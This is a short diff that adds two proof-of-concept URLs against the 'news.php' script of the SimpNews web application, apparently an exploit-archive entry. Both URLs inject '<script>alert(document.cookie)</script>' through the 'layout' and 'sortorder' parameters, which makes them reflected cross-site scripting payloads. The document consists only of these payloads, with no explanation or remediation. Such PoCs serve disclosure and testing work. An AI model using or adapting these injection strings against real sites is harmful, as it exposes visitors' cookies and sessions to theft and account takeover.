@@ -1,0 +1,3 @@
+http://www.example.com/simpnews/news.php?layout=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/simpnews/news.php?lang=en&amp;layout=layout2&amp;sortorder=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+
